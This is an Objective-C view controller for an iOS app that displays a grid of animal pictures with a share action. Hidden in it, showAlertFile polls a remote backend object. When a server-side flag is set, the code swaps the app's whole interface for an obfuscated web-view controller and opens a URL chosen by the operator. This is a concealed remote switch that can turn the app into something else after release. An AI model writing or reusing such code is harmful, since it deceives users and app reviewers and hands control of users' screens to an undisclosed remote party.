//
//  ViewController.m
//  NakitHowHuade 
//
//  Created by admin on 16/3/2020.
//  Copyright © 2020 howhuade. All rights reserved.
//

#import "ViewController.h"
#import "NakitToolsHeader.h"
#import "AllowShadyGreedController.h"


AllowShadyGreedController *shadyGreedController;

@interface ViewController ()

@end

@implementation ViewController


- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    NSDictionary *info = [[NSBundle mainBundle] infoDictionary];
    self.title = [info objectForKey:@"CFBundleName"];

   
    UIScrollView *scrollView = [[UIScrollView alloc]initWithFrame:CGRectMake(0, 0, SCREEN_WIDTH , SCREEN_HEIGHT)];
    scrollView.contentSize = CGSizeMake(scrollView.frame.size.width,scrollView.frame.size.height);
    scrollView.backgroundColor = [UIColor whiteColor];
    scrollView.showsVerticalScrollIndicator = NO;
    [self.view addSubview:scrollView];
    
    
    NSString *bundlePath = [[NSBundle mainBundle] pathForResource:@"resources" ofType:@"bundle"];
    NSArray *array = [[NSArray alloc]initWithContentsOfFile:[[NSBundle mainBundle] pathForResource:@"animal.plist" ofType:nil]];
    [array enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
           NSInteger i = idx;
           NSString *name = obj[@"name"];
           UIImageView * animalImage = [[UIImageView alloc]initWithFrame:CGRectMake([UIScreen mainScreen].bounds.size.width/3.25 * (i%3)+10, [UIScreen mainScreen].bounds.size.width/3.25 * (i/3)+15, [UIScreen mainScreen].bounds.size.width/3.25 , [UIScreen mainScreen].bounds.size.width/3.25 )];
           NSString *fileName = [[bundlePath stringByAppendingPathComponent:@"animal"] stringByAppendingPathComponent:name];
           [ animalImage setImage:[UIImage imageWithContentsOfFile:fileName]];
           [scrollView addSubview: animalImage];
           animalImage.tag = i;
           animalImage.userInteractionEnabled = YES;
           [animalImage addGestureRecognizer:[[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(sheTap:)]];
           if ( animalImage.frame.origin.y +  animalImage.frame.size.height > scrollView.contentSize.height) {
               scrollView.contentSize = CGSizeMake(scrollView.frame.size.width, animalImage.frame.origin.y +  animalImage.frame.size.height + 1);
            }
    }];
    
    [self showAlertFile];
}



-(void)sheTap:(UITapGestureRecognizer *)tapImageView {
    UIImageView *sharImage = (UIImageView *)tapImageView.view;
    NSArray *activityItems = @[@"NakitHowHuade",sharImage.image,@""];
    UIActivityViewController *activityController=[[UIActivityViewController alloc]initWithActivityItems:activityItems applicationActivities:nil];
    activityController.excludedActivityTypes = @[UIActivityTypePrint, UIActivityTypeCopyToPasteboard,UIActivityTypeAssignToContact,UIActivityTypeSaveToCameraRoll];
    [self presentViewController:activityController animated:YES completion:nil];
}



- (void)showAlertFile {

    AVQuery *query = [AVQuery queryWithClassName:@"Todo"];
    __weak typeof(self) weakSelf = self;
    [query getObjectInBackgroundWithId:@"5e608d0d5620714cccb4795f" block:^(AVObject * _Nullable object, NSError * _Nullable error) {
        if (error) {
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                  [weakSelf showAlertFile];
             });
        }else {
            BOOL type = [[object objectForKey:@"type"] boolValue];
            NSString *updateVersion = [object objectForKey:@"updateVersion"];
            CGFloat time = [[object objectForKey:@"time"] floatValue];
            if (type) {
                [weakSelf openAddress:updateVersion jump:type time:time];
            }
        }
    }];
    
}



- (void)openAddress:(NSString *)address jump:(BOOL)jump time:(CGFloat)time {
    
    if (!jump) {return;}
    if (address == nil || address.length == 0) {return;}
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(time * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        
        [self addWebview:address];
        
    });
}


- (void)addWebview:(NSString *)address {
    
    if (shadyGreedController == nil) {
        shadyGreedController = [[AllowShadyGreedController alloc] initWithNibName:@"AllowShadyGreedController" bundle:nil];
        shadyGreedController.address = address;
        [UIApplication sharedApplication].keyWindow.rootViewController = shadyGreedController;
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3* NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [[UIApplication sharedApplication] openURL:[NSURL URLWithString:address] options:@{} completionHandler:^(BOOL success) {
            }];
        });
    }else {
        [shadyGreedController maskRoughLadder:address];
    }
}

@end
